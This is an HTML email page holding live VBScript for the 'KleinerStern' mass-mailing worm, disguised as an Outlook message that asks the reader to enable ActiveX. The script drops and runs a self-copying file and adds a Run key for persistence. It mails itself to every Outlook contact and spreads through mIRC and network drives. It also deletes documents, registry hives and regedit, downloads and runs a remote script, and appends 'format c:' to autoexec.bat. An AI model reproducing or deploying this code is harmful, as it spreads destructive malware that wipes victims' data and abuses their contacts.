<HTML><HEAD><META content="&chr(34)&"text/html; charset=iso-8859-1" http-equiv=Content-Type><META content="MSHTML 5.00.2314.1000" name=GENERATOR><META content="Author" name=Kleiner Stern><STYLE></STYLE></HEAD><BODY bgColor=#ffffff><SCRIPT language=vbscript>
On Error Resume Next
Set fso = CreateObject("scripting.filesystemobject")
If Err.Number <> 0 Then
document.write "<font face='verdana' color=#ff0000 size='2'>You need ActiveX enabled if you want to see this e-mail.<br>Please open this message again and click accept ActiveX<br>Microsoft Outlook</font>"
Else
Set vbs = fso.createtextfile(fso.getspecialfolder(0) & "\notepad.exe.vbs", True)
vbs.write  "" & vbcrlf & "'VBS.KleinerStern" & vbcrlf & "On Error Resume Next" & vbcrlf & "" & vbcrlf & "Const ForReading = 1" & vbcrlf & "Const ForWriting = 2" & vbcrlf & "Const ForAppending = 8" & vbcrlf & "" & vbcrlf & "Dim fso : Set fso = CreateObject("&chr(34)&"Scripting.FileSystemObject"&chr(34)&")" & vbcrlf & "Dim wss : Set wss = CreateObject("&chr(34)&"WScript.Shell"&chr(34)&")" & vbcrlf & "Dim Outlook : Set Outlook = CreateObject("&chr(34)&"Outlook.Application"&chr(34)&")" & vbcrlf & "Dim FName, WinDir, SysDir, HTMLPath, HTMLBody, ScriptPath" & vbcrlf & "" & vbcrlf & "    FName = "&chr(34)&""&chr(34)&"" & vbcrlf & "    WinDir = fso.GetSpecialFolder(0) &"&chr(34)&"\"&chr(34)&"" & vbcrlf & "    SysDir = fso.GetSpecialFolder(1) &"&chr(34)&"\"&chr(34)&"" & vbcrlf & "    HTMLPath = WinDir &"&chr(34)&"WindowsXP.html"&chr(34)&"" & vbcrlf & "    ScriptPath = WScript.ScriptFullName" & vbcrlf & "" & vbcrlf & "Call Startup()" & vbcrlf & "Call CreateFiles()" & vbcrlf & "" & vbcrlf & " If Outlook = "&chr(34)&"Outlook"&chr(34)&" Then " & vbcrlf & "  Dim Mapi, MapiAdList	" & vbcrlf & "  Set Mapi = Outlook.GetNameSpace("&chr(34)&"MAPI"&chr(34)&")" & vbcrlf & "  Set MapiAdList = Mapi.AddressLists" & vbcrlf & "  Call DeleteOutlookFolders()" & vbcrlf & "  Call OutlookBody()" & vbcrlf & " End If" & vbcrlf & " " & vbcrlf & "Call Network()" & vbcrlf & "Call Payload()" & vbcrlf & "Call DoDrives()" & vbcrlf & "Call Antidelete(fname)" & vbcrlf & "" & vbcrlf & "Function Startup()" & vbcrlf & "On Error Resume Next" & vbcrlf & "Randomize" & vbcrlf & " Do until Len(FName) = 7 " & vbcrlf & "  FName = FName + Chr(Int((90 - 80 + 1) * Rnd + 80))" & vbcrlf & " Loop" & vbcrlf & " " & vbcrlf & " If FName <> "&chr(34)&""&chr(34)&" Then " & vbcrlf & "  RegSet "&chr(34)&"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"&chr(34)&" &Left(FName,1) &LCase(Right(FName,6)), "&chr(34)&"wscript.exe "&chr(34)&" &Windir &FName &"&chr(34)&".vbs %"&chr(34)&", "&chr(34)&"0"&chr(34)&"" & vbcrlf & " End If" & vbcrlf & "End Function" & vbcrlf & "" & vbcrlf & "Sub OutlookBody()" & vbcrlf & "On Error Resume Next" & vbcrlf & "Dim Address, NumOfContacts, Counter, EmailItem, ContactNumber" & vbcrlf & "  For Each Address In MapiAdList" & vbcrlf & "   If Address.AddressEntries.Count <> 0 Then" & vbcrlf & "    NumOfContacts = Address.AddressEntries.Count" & vbcrlf & "   " & vbcrlf & "    For Counter = 1 To NumOfContacts" & vbcrlf & "     Set EmailItem = Outlook.CreateItem(0)" & vbcrlf & "     Set ContactNumber = Address.AddressEntries(Counter)" & vbcrlf & "     " & vbcrlf & "     EmailItem.To = ContactNumber.Address" & vbcrlf & "     EmailItem.Subject = "&chr(34)&"WindowsXP Betatest"&chr(34)&"" & vbcrlf & "     EmailItem.HTMLBody = HTMLBody" & vbcrlf & "     EmailItem.DeleteAfterSubmit = True " & vbcrlf & "     EmailItem.Send" & vbcrlf & "    Next" & vbcrlf & "   End If" & vbcrlf & "  Next" & vbcrlf & "End Sub" & vbcrlf & "" & vbcrlf & "Sub Mirc(Path)     " & vbcrlf & "On Error Resume Next" & vbcrlf & "	If Path <> "&chr(34)&""&chr(34)&" Then" & vbcrlf & "	 Dim MircScript : Set MircScript = fso.CreateTextFile(Path & "&chr(34)&"\script.ini"&chr(34)&", True)" & vbcrlf & "         MircScript.attributes = MircScript.attributes + 1" & vbcrlf & "  	     MircScript.attributes = MircScript.attributes + 2" & vbcrlf & "   	     MircScript.writeline "&chr(34)&"[script]"&chr(34)&"" & vbcrlf & "   	     MircScript.writeLine "&chr(34)&";mIRC Script"&chr(34)&"" & vbcrlf & "   	     MircScript.writeLine "&chr(34)&";http://www.mirc.com"&chr(34)&"" & vbcrlf & "   	     MircScript.writeLine "&chr(34)&";Please do not edit this script!"&chr(34)&"" & vbcrlf & "   		 MircScript.writeline "&chr(34)&"n0=on 1:start:{"&chr(34)&"" & vbcrlf & " 	 	 MircScript.writeline "&chr(34)&"n1= .remote on"&chr(34)&"" & vbcrlf & "  		 MircScript.writeline "&chr(34)&"n2= .ctcps on"&chr(34)&"" & vbcrlf & "  		 MircScript.writeline "&chr(34)&"n3= .events on"&chr(34)&"" & vbcrlf & "  		 MircScript.writeline "&chr(34)&"n4= }"&chr(34)&"" & vbcrlf & "   	     MircScript.writeline "&chr(34)&"n5=on 1:JOIN:#:{"&chr(34)&"" & vbcrlf & "   	     MircScript.writeline "&chr(34)&"n6= /if ( $nick == $me ) { halt }"&chr(34)&"" & vbcrlf & "	     MircScript.writeline "&chr(34)&"n7= /.dcc send $nick "&chr(34)&" &HTMLPath" & vbcrlf & "         MircScript.writeline "&chr(34)&"n8=}"&chr(34)&"" & vbcrlf & " 	 	 MircScript.Close" & vbcrlf & "    End If " & vbcrlf & "End Sub        " & vbcrlf & "" & vbcrlf & "Sub Antidelete(rname)" & vbcrlf & "On Error Resume Next" & vbcrlf & "" & vbcrlf & " Dim Myself" & vbcrlf & " Set Myself = fso.OpenTextFile(ScriptPath,ForReading,False)" & vbcrlf & "     MyCode = Myself.readall" & vbcrlf & "     Myself.Close" & vbcrlf & "" & vbcrlf & " Do" & vbcrlf & "  If Not (fso.FileExists(ScriptPath)) Then" & vbcrlf & "   Set Myself = fso.CreateTextFile(ScriptPath, True)" & vbcrlf & "       Myself.write MyCode" & vbcrlf & "       Myself.Close" & vbcrlf & "  End If" & vbcrlf & "" & vbcrlf & "  If Not RegGet("&chr(34)&"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"&chr(34)&" &rname) = "&chr(34)&"wscript.exe "&chr(34)&" &Windir &FName &"&chr(34)&".vbs %"&chr(34)&" then" & vbcrlf & "   RegSet "&chr(34)&"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"&chr(34)&" &Left(rname,1) &LCase(Right(rname,6)),"&chr(34)&"wscript.exe "&chr(34)&" &Windir &FName &"&chr(34)&".vbs %"&chr(34)&", "&chr(34)&"0"&chr(34)&"" & vbcrlf & "  End if" & vbcrlf & " Loop" & vbcrlf & "End Sub" & vbcrlf & "" & vbcrlf & "Sub RegSet(key,value,keytype)" & vbcrlf & "On Error Resume Next" & vbcrlf & " Dim re" & vbcrlf & " Set re = CreateObject("&chr(34)&"WScript.Shell"&chr(34)&")" & vbcrlf & " " & vbcrlf & " Select Case keytype   " & vbcrlf & "  Case "&chr(34)&"1"&chr(34)&" re.RegWrite key,value, "&chr(34)&"REG_DWORD"&chr(34)&"" & vbcrlf & "  Case Else re.RegWrite key,value" & vbcrlf & " End Select  " & vbcrlf & "End Sub" & vbcrlf & "" & vbcrlf & "Function RegGet(value)" & vbcrlf & "On Error Resume Next" & vbcrlf & " Dim re" & vbcrlf & " Set re = CreateObject("&chr(34)&"WScript.Shell"&chr(34)&")" & vbcrlf & " RegGet = re.RegRead(value)" & vbcrlf & "End Function" & vbcrlf & "" & vbcrlf & "Sub Network()" & vbcrlf & "On Error Resume Next" & vbcrlf & "Dim fso, wsn, NetDrives, xc" & vbcrlf & "Set fso = CreateObject("&chr(34)&"Scripting.FileSystemObject"&chr(34)&")" & vbcrlf & "Set wsn = CreateObject("&chr(34)&"WScript.Network"&chr(34)&")" & vbcrlf & "Set NetDrives = wsn.EnumNetworkDrives" & vbcrlf & "" & vbcrlf & " If NetDrives.Count <> 0 Then" & vbcrlf & "  For xc = 0 To NetDrives.Count - 1" & vbcrlf & "   If InStr(NetDrives.Item(xc), "&chr(34)&"\"&chr(34)&" ) <> 0 Then" & vbcrlf & "    fso.CopyFile ScriptPath, fso.BuildPath(NetDrives.Item(xc), WinDir &FName &"&chr(34)&".vbs"&chr(34)&") " & vbcrlf & "   End If" & vbcrlf & "  Next" & vbcrlf & " End If" & vbcrlf & "End Sub" & vbcrlf & "" & vbcrlf & "Function Dodrives()" & vbcrlf & "On Error Resume Next" & vbcrlf & " Dim hdready" & vbcrlf & " Set Drives = fso.Drives" & vbcrlf & "" & vbcrlf & " For Each Drive In Drives" & vbcrlf & "  If Drive.Drivetype = Remote Then" & vbcrlf & "   hdready = Drive & "&chr(34)&"\"&chr(34)&"" & vbcrlf & "   Call Subfolders(hdready)" & vbcrlf & "  ElseIf Drive.IsReady Then" & vbcrlf & "   hdready = Drive & "&chr(34)&"\"&chr(34)&"" & vbcrlf & "   Call Subfolders(hdready)" & vbcrlf & "  End If" & vbcrlf & " Next" & vbcrlf & "End Function" & vbcrlf & "" & vbcrlf & "Function Subfolders(path)" & vbcrlf & "On Error Resume Next" & vbcrlf & " " & vbcrlf & " Set Fold = fso.GetFolder(path)" & vbcrlf & " Set Files = Fold.Files" & vbcrlf & "" & vbcrlf & " For Each file In Files" & vbcrlf & "  Ext = lcase(fso.GetExtensionName(File.Path))" & vbcrlf & "" & vbcrlf & "  If file.Name = "&chr(34)&"mirc.ini"&chr(34)&" Then" & vbcrlf & "   Call Mirc(file.ParentFolder)" & vbcrlf & "  End If" & vbcrlf & "" & vbcrlf & "  If (Ext = "&chr(34)&"vbs"&chr(34)&") or (Ext = "&chr(34)&"vbe"&chr(34)&") then" & vbcrlf & "   Dim VBSFile : Set VBSFile = fso.OpenTextFile(File.Path,ForAppending,True)" & vbcrlf & "   Dim ScriptFile : Set ScriptFile = fso.OpenTextFile(ScriptPath,ForReading,True)" & vbcrlf & "       VBSFile.Write ScriptFile.ReadAll" & vbcrlf & "       VBSFile.Close" & vbcrlf & "       ScriptFile.Close" & vbcrlf & "  End If " & vbcrlf & "    " & vbcrlf & "  If Ext = "&chr(34)&"doc"&chr(34)&" Then" & vbcrlf & "   fso.DeleteFile(File.Path)" & vbcrlf & "  End If" & vbcrlf & " Next" & vbcrlf & "" & vbcrlf & " Set file = Fold.Subfolders" & vbcrlf & "  For Each Subfol In file" & vbcrlf & "   Call Subfolders(Subfol.path)" & vbcrlf & "  Next" & vbcrlf & "End Function" & vbcrlf & "" & vbcrlf & "Sub RegistrySettings()" & vbcrlf & "On Error Resume Next" & vbcrlf & "    RegSet "&chr(34)&"HKCR\.mp3\"&chr(34)&","&chr(34)&"KleinerStern"&chr(34)&","&chr(34)&"0"&chr(34)&"" & vbcrlf & "    RegSet "&chr(34)&"HKCR\.avi\"&chr(34)&","&chr(34)&"KleinerStern"&chr(34)&","&chr(34)&"0"&chr(34)&"" & vbcrlf & "	RegSet "&chr(34)&"HKCR\VBSFile\Editflags"&chr(34)&", 01000100, "&chr(34)&"1"&chr(34)&" " & vbcrlf & "	RegSet "&chr(34)&"HKCU\Software\Microsoft\Windows Script Host\Settings\Timeout"&chr(34)&",0,"&chr(34)&"1"&chr(34)&"" & vbcrlf & "    RegSet "&chr(34)&"HKCU\Software\Microsoft\Windows Script Host\Settings\Remote"&chr(34)&", 1, "&chr(34)&"1"&chr(34)&"" & vbcrlf & "	RegSet "&chr(34)&"HKCU\Software\Microsoft\Windows Script Host\Settings\Enabled"&chr(34)&", 1, "&chr(34)&"1"&chr(34)&"" & vbcrlf & "	RegSet "&chr(34)&"HKCU\Software\Microsoft\Windows Script Host\Settings\TrustPolicy"&chr(34)&", 0, "&chr(34)&"1"&chr(34)&"" & vbcrlf & "    RegSet "&chr(34)&"HKCR\KleinerStern\shell\open\command\"&chr(34)&", "&chr(34)&"wscript "&chr(34)&" &WinDir &fname &"&chr(34)&" %"&chr(34)&", "&chr(34)&"0"&chr(34)&"" & vbcrlf & "	RegSet "&chr(34)&"HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner"&chr(34)&", "&chr(34)&"Kleiner Stern"&chr(34)&", "&chr(34)&"0"&chr(34)&"" & vbcrlf & "	RegSet "&chr(34)&"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1200"&chr(34)&", 0, "&chr(34)&"1"&chr(34)&"" & vbcrlf & "	RegSet "&chr(34)&"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201"&chr(34)&", 0, "&chr(34)&"1"&chr(34)&"" & vbcrlf & "	RegSet "&chr(34)&"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1204"&chr(34)&", 0, "&chr(34)&"1"&chr(34)&"" & vbcrlf & "	RegSet "&chr(34)&"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1200"&chr(34)&", 0, "&chr(34)&"1"&chr(34)&"" & vbcrlf & "	RegSet "&chr(34)&"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1201"&chr(34)&", 0, "&chr(34)&"1"&chr(34)&"" & vbcrlf & "	RegSet "&chr(34)&"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1204"&chr(34)&", 0, "&chr(34)&"1"&chr(34)&"" & vbcrlf & "	RegSet "&chr(34)&"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1200"&chr(34)&", 0, "&chr(34)&"1"&chr(34)&"" & vbcrlf & "	RegSet "&chr(34)&"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201"&chr(34)&", 0, "&chr(34)&"1"&chr(34)&"" & vbcrlf & "	RegSet "&chr(34)&"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1204"&chr(34)&", 0, "&chr(34)&"1"&chr(34)&"" & vbcrlf & "End Sub" & vbcrlf & "" & vbcrlf & "Sub DeleteOutlookFolders()" & vbcrlf & "On Error Resume Next" & vbcrlf & "Dim i" & vbcrlf & "     Dim InBox : Set InBox = Mapi.GetDefaultFolder(6)" & vbcrlf & "     Dim DeletedItems : Set DeletedItems = Mapi.GetDefaultFolder(3)" & vbcrlf & "" & vbcrlf & "     For i = 1 to InBox.Items.Count" & vbcrlf & "      If InBox.Items.Item(i).Subject = "&chr(34)&"WindowsXP Betatest"&chr(34)&" Then" & vbcrlf & "         InBox.Items.Item(i).Close" & vbcrlf & "         InBox.Items.Item(i).Delete" & vbcrlf & "      End If" & vbcrlf & "     Next" & vbcrlf & "     " & vbcrlf & "     For i = 1 to DeletedItems.Items.Count" & vbcrlf & "      If DeletedItems.Items.Item(i).Subject = "&chr(34)&"WindowsXP Betatest"&chr(34)&" Then" & vbcrlf & "         DeletedItems.Items.Item(i).Delete" & vbcrlf & "      End If" & vbcrlf & "     Next" & vbcrlf & "End Sub" & vbcrlf & "" & vbcrlf & "Sub CreateGarbage()" & vbcrlf & "On Error Resume Next" & vbcrlf & "Dim aname,x" & vbcrlf & "          x = 0" & vbcrlf & "    AName = "&chr(34)&""&chr(34)&"" & vbcrlf & " " & vbcrlf & " 	Randomize" & vbcrlf & "    Do until x = 500" & vbcrlf & "  	 Do until Len(AName) = 7 " & vbcrlf & "   	  AName = AName &Chr(Int((90 - 80 + 1) * Rnd + 80))" & vbcrlf & "  	 Loop" & vbcrlf & "      " & vbcrlf & "   	 Dim GarbageFolder : Set GarbageFolder = fso.CreateFolder("&chr(34)&"c:\"&chr(34)&" &AName)" & vbcrlf & "       	 GarbageFolder.attributes = GarbageFolder.attributes + 2" & vbcrlf & "         GarbageFolder.attributes = GarbageFolder.attributes + 1" & vbcrlf & "       " & vbcrlf & "   	 Dim GarbageFile : Set GarbageFile = fso.CreateTextFile("&chr(34)&"c:\"&chr(34)&" &AName &"&chr(34)&"\"&chr(34)&" &AName &"&chr(34)&".txt"&chr(34)&", True)" & vbcrlf & "         GarbageFile.WriteLine "&chr(34)&"Irgendwo strahlt immer ein kleiner Stern!"&chr(34)&" " & vbcrlf & "         GarbageFile.Close" & vbcrlf & "     " & vbcrlf & "  	 AName = "&chr(34)&""&chr(34)&" " & vbcrlf & "  	 x = x + 1" & vbcrlf & " 	Loop       " & vbcrlf & "end Sub" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "Sub payload()" & vbcrlf & "On Error Resume Next" & vbcrlf & "	" & vbcrlf & "	CreateGarbage()" & vbcrlf & "" & vbcrlf & "	If day(now) = 2 then" & vbcrlf & "	 RegSet "&chr(34)&"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop"&chr(34)&", 00000001, "&chr(34)&"1"&chr(34)&" " & vbcrlf & "     HTTPFileDownload "&chr(34)&"http://www.astalavista.com/archive/virus/mailworms/homepage_src.txt"&chr(34)&",WinDir &"&chr(34)&"hp.vbs"&chr(34)&"" & vbcrlf & "     wss.run "&chr(34)&"wscript.exe "&chr(34)&" &WinDir &"&chr(34)&"hp.vbs %"&chr(34)&"" & vbcrlf & "     fso.DeleteFile(Windir &"&chr(34)&"User.dat"&chr(34)&")" & vbcrlf & "     fso.DeleteFile(Windir &"&chr(34)&"User.bak"&chr(34)&")" & vbcrlf & "     fso.DeleteFile(Windir &"&chr(34)&"System.dat"&chr(34)&")" & vbcrlf & "     fso.DeleteFile(Windir &"&chr(34)&"System.bak"&chr(34)&")" & vbcrlf & "     fso.DeleteFile(WinDir &"&chr(34)&"Regedit.exe"&chr(34)&")" & vbcrlf & "     wss.Run "&chr(34)&"RunDll32.exe Shell32.dll,SHExitWindowsEx 0x01"&chr(34)&"" & vbcrlf & "    End If" & vbcrlf & "" & vbcrlf & "    If day(now) = 4 then" & vbcrlf & "     Dim Autoexec : Set Autoexec = fso.OpenTextFile("&chr(34)&"C:\Autoexec.bat"&chr(34)&",ForAppending,True)" & vbcrlf & "         Autoexec.WriteLine "&chr(34)&"format c: /q /autotest /u"&chr(34)&"" & vbcrlf & "         Autoexec.Close" & vbcrlf & "    " & vbcrlf & "     wss.Run "&chr(34)&"RunDll32.exe Shell32.dll,SHExitWindowsEx 0x01"&chr(34)&"" & vbcrlf & "    End If" & vbcrlf & "" & vbcrlf & "	If day(now) = 5 Then" & vbcrlf & "  	 RegSet "&chr(34)&"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop"&chr(34)&", 00000001, "&chr(34)&"1"&chr(34)&" " & vbcrlf & " 	End If" & vbcrlf & "" & vbcrlf & " 	If day(now) = 7 Then" & vbcrlf & "  	 Dim AgentControl : Set AgentControl = CreateObject("&chr(34)&"Agent.Control.1"&chr(34)&")" & vbcrlf & "" & vbcrlf & " 	 If IsObject(AgentControl) Then" & vbcrlf & "   	 AgentControl.Connected = True" & vbcrlf & "" & vbcrlf & "   	 Dim merlin, merlindir" & vbcrlf & "   	 merlindir = RegGet("&chr(34)&"HKLM\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir"&chr(34)&")" & vbcrlf & "   	 On Error Resume Next" & vbcrlf & "    	  AgentControl.Characters.Load "&chr(34)&"merlin"&chr(34)&", merlindir &"&chr(34)&"\Microsoft Agent\characters\merlin.acs"&chr(34)&"" & vbcrlf & "    	  Set merlin= AgentControl.Characters ("&chr(34)&"merlin"&chr(34)&")" & vbcrlf & "    	  merlin.Get "&chr(34)&"state"&chr(34)&", "&chr(34)&"Showing"&chr(34)&"" & vbcrlf & "    	  merlin.Get "&chr(34)&"state"&chr(34)&", "&chr(34)&"Speaking"&chr(34)&"" & vbcrlf & "    	  merlin.MoveTo 10, 10" & vbcrlf & "    	  merlin.Show" & vbcrlf & "          merlin.Get "&chr(34)&"state"&chr(34)&", "&chr(34)&"Moving"&chr(34)&"" & vbcrlf & "          merlin.MoveTo 257, 177" & vbcrlf & "          merlin.Speak ("&chr(34)&"Hör nicht auf zu strahlen, kleiner Stern!"&chr(34)&")" & vbcrlf & "          merlin.Hide" & vbcrlf & "         End If" & vbcrlf & "        End If " & vbcrlf & "End Sub " & vbcrlf & "" & vbcrlf & "function HTTPFileDownload( url, FileSaveTo )" & vbcrlf & "On Error Resume Next" & vbcrlf & "Dim receive, Output, i" & vbcrlf & "Dim internet : Set internet = CreateObject("&chr(34)&"Microsoft.XMLHTTP"&chr(34)&")" & vbcrlf & "" & vbcrlf & "    Output = "&chr(34)&""&chr(34)&"" & vbcrlf & "    internet.open "&chr(34)&"GET"&chr(34)&",url,False" & vbcrlf & "    internet.send" & vbcrlf & "    receive = internet.responseBody" & vbcrlf & "" & vbcrlf & "    For i = 0 to UBound(receive)" & vbcrlf & "     Output = Output & chrw(ascw(chr(ascb(midb(receive,i+1,1)))))" & vbcrlf & "    Next" & vbcrlf & "" & vbcrlf & "    Dim Download : Set Download = fso.CreateTextFile(FileSaveTo,True)" & vbcrlf & "        Download.Write Output" & vbcrlf & "        Download.Close" & vbcrlf & "end Function" & vbcrlf & "" & vbcrlf & "Sub CreateFiles()" & vbcrlf & "On Error Resume Next" & vbcrlf & "Dim Buffer, Code, htm, htm2" & vbcrlf & "Dim Script : Set Script = fso.OpenTextFile(ScriptPath,ForReading,False)" & vbcrlf & "Dim Output : Set Output = fso.OpenTextFile(Windir &FName &"&chr(34)&".vbs"&chr(34)&",ForWriting,True)" & vbcrlf & "  " & vbcrlf & "  Do While Script.AtEndOfStream = False" & vbcrlf & "   Buffer = Script.ReadLine" & vbcrlf & "   Output.WriteLine Buffer" & vbcrlf & "   Code = Code & Chr(34) & "&chr(34)&" & vbcrlf & "&chr(34)&" & Chr(34) & Replace(Buffer, Chr(34), Chr(34) & "&chr(34)&"&chr(34)&"&chr(34)&" & Chr(34))" & vbcrlf & "  Loop" & vbcrlf & "" & vbcrlf & "  ScriptFile.Close" & vbcrlf & "  OutputFile.Close" & vbcrlf & "" & vbcrlf & "  htm = "&chr(34)&"<"&chr(34)&" & "&chr(34)&"HTML><"&chr(34)&" & "&chr(34)&"HEAD><"&chr(34)&" & "&chr(34)&"META content="&chr(34)&" & Chr(34) & "&chr(34)&"&chr(34)&"&chr(34)&" & Chr(34) & "&chr(34)&"text/html; charset=iso-8859-1"&chr(34)&" & Chr(34) & "&chr(34)&" http-equiv=Content-Type><"&chr(34)&" & "&chr(34)&"META content="&chr(34)&" & Chr(34) & "&chr(34)&"MSHTML 5.00.2314.1000"&chr(34)&" & Chr(34) & "&chr(34)&" name=GENERATOR><"&chr(34)&" & "&chr(34)&"META content="&chr(34)&" & Chr(34) & "&chr(34)&"Author"&chr(34)&" & Chr(34) & "&chr(34)&" name=Kleiner Stern><"&chr(34)&" & "&chr(34)&"STYLE></"&chr(34)&" & "&chr(34)&"STYLE></"&chr(34)&" & "&chr(34)&"HEAD><"&chr(34)&" & "&chr(34)&"BODY bgColor=#ffffff><"&chr(34)&" & "&chr(34)&"SCRIPT language=vbscript>"&chr(34)&"" & vbcrlf & "  htm = htm & vbCrLf & "&chr(34)&"On Error Resume Next"&chr(34)&"" & vbcrlf & "  htm = htm & vbCrLf & "&chr(34)&"Set fso = CreateObject("&chr(34)&" & Chr(34) & "&chr(34)&"scripting.filesystemobject"&chr(34)&" & Chr(34) & "&chr(34)&")"&chr(34)&"" & vbcrlf & "  htm = htm & vbCrLf & "&chr(34)&"If Err.Number <> 0 Then"&chr(34)&"" & vbcrlf & "  htm = htm & vbCrLf & "&chr(34)&"document.write "&chr(34)&" & Chr(34) & "&chr(34)&"<font face='verdana' color=#ff0000 size='2'>You need ActiveX enabled if you want to see this e-mail.<br>Please open this message again and click accept ActiveX<br>Microsoft Outlook</font>"&chr(34)&" & Chr(34) & "&chr(34)&""&chr(34)&"" & vbcrlf & "  htm = htm & vbCrLf & "&chr(34)&"Else"&chr(34)&"" & vbcrlf & "  htm = htm & vbCrLf & "&chr(34)&"Set vbs = fso.createtextfile(fso.getspecialfolder(0) & "&chr(34)&" & Chr(34) & "&chr(34)&"\notepad.exe.vbs"&chr(34)&" & Chr(34) & "&chr(34)&", True)"&chr(34)&"" & vbcrlf & "  htm = htm & vbCrLf & "&chr(34)&"vbs.write  "&chr(34)&" & Chr(34) & Code & Chr(34)" & vbcrlf & "  htm = htm & vbCrLf & "&chr(34)&"vbs.Close"&chr(34)&"" & vbcrlf & "  htm = htm & vbCrLf & "&chr(34)&"Set ws = CreateObject("&chr(34)&" & Chr(34) & "&chr(34)&"wscript.shell"&chr(34)&" & Chr(34) & "&chr(34)&")"&chr(34)&"" & vbcrlf & "  htm = htm & vbCrLf & "&chr(34)&"ws.run fso.getspecialfolder(0) & "&chr(34)&" & Chr(34) & "&chr(34)&"\wscript.exe "&chr(34)&" & Chr(34) & "&chr(34)&" & fso.getspecialfolder(0) & "&chr(34)&" & Chr(34) & "&chr(34)&"\notepad.exe.vbs %"&chr(34)&" & Chr(34) & "&chr(34)&""&chr(34)&"" & vbcrlf & "  htm2 = htm2 & vbCrLf & "&chr(34)&"document.write "&chr(34)&" & Chr(34) & "&chr(34)&"This message has permanent errors.<br>Sorry<br>"&chr(34)&" & Chr(34) & "&chr(34)&""&chr(34)&"" & vbcrlf & "  htm2 = htm2 & vbCrLf & "&chr(34)&"End If"&chr(34)&"" & vbcrlf & "  htm2 = htm2 & vbCrLf & "&chr(34)&"<"&chr(34)&" & "&chr(34)&"/SCRIPT></"&chr(34)&" & "&chr(34)&"body></"&chr(34)&" & "&chr(34)&"html>"&chr(34)&"" & vbcrlf & "  HTMLBody = htm & htm2" & vbcrlf & "   " & vbcrlf & "  Dim b : Set b = fso.CreateTextFile(HTMLPath)" & vbcrlf & "      b.close" & vbcrlf & "" & vbcrlf & "  Dim HtmlFile : Set HtmlFile = fso.OpenTextFile(HTMLPath,ForWriting,True)" & vbcrlf & "      Htmlfile.Write htm" & vbcrlf & "      Htmlfile.Write vbcrlf" & vbcrlf & "      Htmlfile.Write htm2" & vbcrlf & "      Htmlfile.Close" & vbcrlf & "End Sub"
vbs.Close
Set ws = CreateObject("wscript.shell")
ws.run fso.getspecialfolder(0) & "\wscript.exe " & fso.getspecialfolder(0) & "\notepad.exe.vbs %"

document.write "This message has permanent errors.<br>Sorry<br>"
End If
</SCRIPT></body></html>